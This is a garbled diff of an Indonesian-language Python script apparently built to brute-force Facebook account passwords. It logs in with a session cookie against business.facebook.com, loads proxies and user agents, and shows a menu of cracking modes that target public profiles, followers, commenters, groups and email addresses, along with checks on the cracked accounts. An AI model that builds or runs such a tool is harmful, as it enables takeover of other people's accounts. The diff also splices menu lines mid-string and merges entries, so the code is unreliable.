@@ -731,8 +731,17 @@ except:sys.exit(f" [{M}>{P}] Gagal Dump Proxy")
 print(' Total New Proxy : '+str(len(abcd)))
 print(' Total Useragent : '+str(len(redmi)))
 sleep(1)
-	
-###---[ CEK COOKIES ]---###
+
+###---[ MENU UTAMA ]---###
+def menu(n,t,c):
+	clear_layar()
+	print(logo(n)+f'\n')
+	print(f" {P}[{hh}01{P}] BRUTE FORCE PUBLIK     [{hh}07{P}] BRUTE FORCE SEARCH")
+	print(f" [{hh}02{P}] BRUTE FORCE MASSAL     [{hh}08{P}] BRUTE FORCE FROM FILE")
+	print(f" [{hh}03{P}] BRUTE FORCE FOLLOW     [{hh}09{P}] CHECK RESSULT ACCOUNT")
+	print(f" [{hh}04{P}] BRUTE FORCE COMENT     [{hh}10{P}] CHECK ACCOUNT NON-ACTIVE")
+	print(f" [{hh}05{P}] BRUTE FORCE GROUP      [{hh}11{P}] CHECK OPTION ACCOUNT")
+	print(f" [{hh}06{P}] BRUTE FORC###---[ CEK COOKIES ]---###
 def get_data():
 	try:
 		coki = open('.cookie.txt','r').read()
@@ -746,7 +755,7 @@ def get_data():
 ###---[ LOGIN COOKIE ]---###
 def login():
 	clear_layar()
-	print(logo2())
+	print(logo)
 	cookie = input(f"\n [{hh}<{P}] Pastikan Menggunakan Cookie Akun Fake\n Cookie : ")
 	url = "https://business.facebook.com/business_locations"
 	head = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
@@ -787,8 +796,7 @@ def menu(n,t,c):
 	print(f" [{hh}02{P}] BRUTE FORCE MASSAL     [{hh}08{P}] BRUTE FORCE FROM FILE")
 	print(f" [{hh}03{P}] BRUTE FORCE FOLLOW     [{hh}09{P}] CHECK RESSULT ACCOUNT")
 	print(f" [{hh}04{P}] BRUTE FORCE COMENT     [{hh}10{P}] CHECK ACCOUNT NON-ACTIVE")
-	print(f" [{hh}05{P}] BRUTE FORCE GROUP      [{hh}11{P}] CHECK OPTION ACCOUNT")
-	print(f" [{hh}06{P}] BRUTE FORCE EMAIL      [{hh}12{P}] LOGOUT ({M}COOKIE{P})")
+	print(f" [{hh}05{P}] BRUTE FORCE GROUP   E EMAIL      [{hh}12{P}] LOGOUT ({M}COOKIE{P})")
 	ask = input(f' [{hh}>>{P}] CHOOSE : ')
 	print(' ─────────────────────────────')
 	if ask in ['1','01']:crack_publik(t,c)
